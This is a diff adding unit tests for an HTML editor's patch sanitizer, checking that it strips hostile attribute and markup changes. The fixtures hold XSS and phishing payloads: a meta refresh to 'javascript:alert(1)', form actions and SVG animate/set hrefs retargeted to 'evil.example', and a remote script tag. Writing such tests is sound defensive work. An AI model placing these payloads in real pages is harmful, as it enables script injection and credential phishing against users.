@@ -14,6 +14,7 @@ import {
   resolveManualEditTargetReference,
   extractIdentityFromAttrSelectorId,
   isEphemeralGeneratedPathId,
+  sanitizeManualEditHtmlFragment,
 } from '../../src/edit-mode/source-patches';
 
 const baseSource = `<!doctype html>
@@ -880,6 +881,115 @@ describe('manual edit source patches', () => {
     });
     expect(frame.ok, frame.error).toBe(true);
     expect(readManualEditAttributes(frame.source, 'frame').src).toBe('/frame.html');
+  });
+
+  it('refuses meta http-equiv/content mutations via set-attributes', () => {
+    const source = [
+      '<!doctype html><html><head>',
+      '<meta data-od-id="refresh" http-equiv="refresh" content="120">',
+      '</head><body></body></html>',
+    ].join('');
+    const result = applyManualEditPatch(source, {
+      kind: 'set-attributes',
+      id: 'refresh',
+      attributes: {
+        'http-equiv': 'refresh',
+        content: '0;url=javascript:alert(1)',
+      },
+    });
+    expect(result.ok, result.error).toBe(true);
+    const attrs = readManualEditAttributes(result.source, 'refresh');
+    expect(attrs.content).toBe('120');
+    expect(attrs.content).not.toMatch(/javascript/i);
+  });
+
+  it('rejects absolute https form action/formaction phishing', () => {
+    const source = [
+      '<!doctype html><html><body>',
+      '<form data-od-id="form" action="/submit"><button data-od-id="submit" formaction="/submit">Go</button></form>',
+      '</body></html>',
+    ].join('');
+    const form = applyManualEditPatch(source, {
+      kind: 'set-attributes',
+      id: 'form',
+      attributes: { action: 'https://evil.example/phish' },
+    });
+    expect(form.ok, form.error).toBe(true);
+    expect(readManualEditAttributes(form.source, 'form').action).toBe('/submit');
+
+    const button = applyManualEditPatch(source, {
+      kind: 'set-attributes',
+      id: 'submit',
+      attributes: { formaction: 'https://evil.example/phish' },
+    });
+    expect(button.ok, button.error).toBe(true);
+    expect(readManualEditAttributes(button.source, 'submit').formaction).toBe('/submit');
+
+    const outer = applyManualEditPatch(source, {
+      kind: 'set-outer-html',
+      id: 'form',
+      html: '<form data-od-id="form" action="https://evil.example/phish"><button>Go</button></form>',
+    });
+    expect(outer.ok, outer.error).toBe(true);
+    expect(readManualEditOuterHtml(outer.source, 'form')).not.toContain('evil.example');
+  });
+
+  it('removes SMIL nodes that retarget href to absolute https', () => {
+    const source = [
+      '<!doctype html><html><body>',
+      '<svg data-od-id="mark"><a href="#safe"><text>hi</text></a></svg>',
+      '</body></html>',
+    ].join('');
+    const result = applyManualEditPatch(source, {
+      kind: 'set-outer-html',
+      id: 'mark',
+      html: [
+        '<svg data-od-id="mark">',
+        '<a href="#safe"><text>hi</text>',
+        '<set attributeName="href" to="https://evil.example/phish"></set>',
+        '</a></svg>',
+      ].join(''),
+    });
+    expect(result.ok, result.error).toBe(true);
+    const html = readManualEditOuterHtml(result.source, 'mark');
+    expect(html).toContain('href="#safe"');
+    expect(html).not.toContain('evil.example');
+    expect(html).not.toMatch(/<set\b/i);
+  });
+
+  it('rejects external animateMotion/animate hrefs', () => {
+    const source = [
+      '<!doctype html><html><body>',
+      '<svg data-od-id="mark"><circle id="c" r="2"></circle></svg>',
+      '</body></html>',
+    ].join('');
+    const result = applyManualEditPatch(source, {
+      kind: 'set-outer-html',
+      id: 'mark',
+      html: [
+        '<svg data-od-id="mark">',
+        '<circle id="c" r="2"></circle>',
+        '<animateMotion path="M0,0 L10,10" href="https://evil.example/x.svg#c"></animateMotion>',
+        '<animate href="https://evil.example/x.svg#c" attributeName="r" to="4"></animate>',
+        '<animateMotion path="M0,0 L1,1" href="#c"></animateMotion>',
+        '</svg>',
+      ].join(''),
+    });
+    expect(result.ok, result.error).toBe(true);
+    const html = readManualEditOuterHtml(result.source, 'mark');
+    expect(html).not.toContain('evil.example');
+    expect(html).toContain('href="#c"');
+  });
+
+  it('sanitizeManualEditHtmlFragment strips nested script and on* handlers', () => {
+    const out = sanitizeManualEditHtmlFragment(
+      '<section class="slide"><h1 onclick="alert(1)">Hero</h1><script src="https://evil.example/x.js"></script></section>',
+    );
+    expect(out).toContain('<h1');
+    expect(out).toContain('Hero');
+    expect(out).not.toMatch(/onclick/i);
+    expect(out).not.toMatch(/<script\b/i);
+    expect(out).not.toContain('evil.example');
   });
 
   it('scrubs -webkit-image-set javascript strings from inline and salvaged styles', () => {
